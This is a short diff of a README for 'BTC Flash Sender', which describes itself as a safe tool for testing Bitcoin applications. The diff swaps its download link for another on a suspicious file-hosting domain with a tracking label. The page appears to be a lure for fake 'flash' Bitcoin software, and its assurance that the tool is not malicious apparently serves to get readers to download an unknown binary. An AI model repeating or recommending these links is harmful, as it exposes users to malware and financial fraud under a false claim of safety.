@@ -6,4 +6,4 @@ BTC Flash Sender is also valuable for those who want to test Bitcoin-related app
 
 This application is not intended for any malicious use, but rather as a safe tool for experimentation and learning. It helps to avoid potential losses and provides a risk-free environment for anyone new to the world of Bitcoin or blockchain technology.
 
-[![Download BTC FlashSender](https://img.shields.io/badge/Download-BTC%20FlashSender-blueviolet)](https://downeefiles.com/s/btshnd)
+[![Download BTC FlashSender](https://img.shields.io/badge/Download-BTC%20FlashSender-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
